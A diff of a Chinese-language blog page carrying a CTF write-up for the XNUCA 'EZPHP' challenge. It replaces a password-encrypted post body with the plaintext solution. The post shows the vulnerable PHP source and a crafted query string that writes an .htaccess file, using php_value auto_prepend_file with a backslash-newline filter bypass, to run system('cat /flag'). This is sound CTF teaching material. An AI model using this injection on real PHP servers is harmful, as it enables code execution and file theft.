@@ -19,10 +19,12 @@
 <meta property="og:site_name" content="ddddhm | glotozz&#39;blog">
 <meta property="og:description" content="这题还是挺不错的">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-09-10T08:19:12.240Z">
+<meta property="og:image" content="https://i.loli.net/2019/09/02/ETLakZPK7qHUltg.png">
+<meta property="og:updated_time" content="2019-09-14T06:32:48.349Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XNUCA-EZPHP">
 <meta name="twitter:description" content="这题还是挺不错的">
+<meta name="twitter:image" content="https://i.loli.net/2019/09/02/ETLakZPK7qHUltg.png">
   
   
     <link rel="icon" href="https://raw.githubusercontent.com/glotozz/images/master/bitbug_favicon.ico">
@@ -167,46 +169,33 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <script src=/js/crypto-js.js></script>
-<script>
-function doDecrypt (pwd, onError) {
-	console.log('in doDecrypt');
-	const txt = document.getElementById('enc_content').innerHTML;
-	let plantext;
-	try {
-		const bytes = CryptoJS.AES.decrypt(txt, pwd);
-		var plaintext = bytes.toString(CryptoJS.enc.Utf8);
-	} catch(err) {
-		if(onError) {
-			onError(err);
-		}
-		return;
-	}
-	document.getElementById('enc_content').innerHTML = plaintext;
-	document.getElementById('enc_content').style.display = 'block';
-	document.getElementById('enc_passwd').style.display = 'none';
-	if(typeof MathJax !== 'undefined') {
-		MathJax.Hub.Queue(
-			['resetEquationNumbers', MathJax.InputJax.TeX],
-			['PreProcess', MathJax.Hub],
-			['Reprocess', MathJax.Hub]
-		);
-	}
-}
-</script>
-<div id="enc_content" style="display:none">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</div>
-<div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div>
-<script>
-var onError = function(error) {
-	document.getElementById("enc_error").innerHTML = "password error!"
-};
-function decrypt() {
-var passwd = document.getElementById("enc_pwd_input").value;
-console.log(passwd);
-doDecrypt(passwd, onError);
-}
-</script>
-</div>
+        <meta name="referrer" content="no-referrer">
+
+<blockquote>
+<p>这题还是挺不错的</p>
+</blockquote>
+<a id="more"></a>
+
+
+
+<blockquote>
+<p>**的同学赛后写了三种方法。。。tql👍</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    $files = scandir(&apos;./&apos;);  </span><br><span class="line">    foreach($files as $file) &#123; </span><br><span class="line">        if(is_file($file))&#123; </span><br><span class="line">            if ($file !== &quot;index.php&quot;) &#123; </span><br><span class="line">                unlink($file); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    include_once(&quot;fl3g.php&quot;); </span><br><span class="line">    if(!isset($_GET[&apos;content&apos;]) || !isset($_GET[&apos;filename&apos;])) &#123; </span><br><span class="line">        highlight_file(__FILE__); </span><br><span class="line">        die(); </span><br><span class="line">    &#125; </span><br><span class="line">    $content = $_GET[&apos;content&apos;]; </span><br><span class="line">    if(stristr($content,&apos;on&apos;) || stristr($content,&apos;html&apos;) || stristr($content,&apos;type&apos;) || stristr($content,&apos;flag&apos;) || stristr($content,&apos;upload&apos;) || stristr($content,&apos;file&apos;)) &#123; </span><br><span class="line">        echo &quot;Hacker&quot;; </span><br><span class="line">        die(); </span><br><span class="line">    &#125; </span><br><span class="line">    $filename = $_GET[&apos;filename&apos;]; </span><br><span class="line">    if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1) &#123; </span><br><span class="line">        echo &quot;Hacker&quot;; </span><br><span class="line">        die(); </span><br><span class="line">    &#125; </span><br><span class="line">    $files = scandir(&apos;./&apos;);  </span><br><span class="line">    foreach($files as $file) &#123; </span><br><span class="line">        if(is_file($file))&#123; </span><br><span class="line">            if ($file !== &quot;index.php&quot;) &#123; </span><br><span class="line">                unlink($file); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    file_put_contents($filename, $content . &quot;\nJust one chance&quot;); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>简单分析，先列出当前文件夹下所有文件，删除除index.php外的文件，包含一个fl3g.php，传参，对文件名和文件内容分别有一个preg_match和stristr过滤，再删除一次文件，最后file_put_contents，也就是我们的利用点</p>
+</blockquote>
+<p>这里记录下最简单、最容易理解的一种方法，.htaccess和.user.ini都支持在开头文件包含，但是生效的条件不同</p>
+<p>用\n绕过stristr的检测，文件名用.htaccess（主要是这里不支持.user.ini，需要cgi/fcgi模式），preg_match()就不需要绕过，并且理论上我们写的是开头自动包含，会在删除前执行我们包含的马</p>
+<p>构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?content=php_value%20auto_prepend_fil\%0ae%20.htaccess%0a%23&lt;?</span><br><span class="line">php%20system(&apos;cat%20/fla&apos;.&apos;g&apos;);?&gt;\&amp;filename=.htaccess</span><br></pre></td></tr></table></figure>
+
+<p>，那么写入.htaccess的内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_fil\</span><br><span class="line">e .htaccess</span><br><span class="line">#&lt;?php system(&apos;cat /fla&apos;.&apos;g&apos;);?&gt;\</span><br><span class="line">Just one chance</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/09/02/ETLakZPK7qHUltg.png" alt="Snipaste_2019-09-02_07-26-45.png"></p>
+
       
 
 
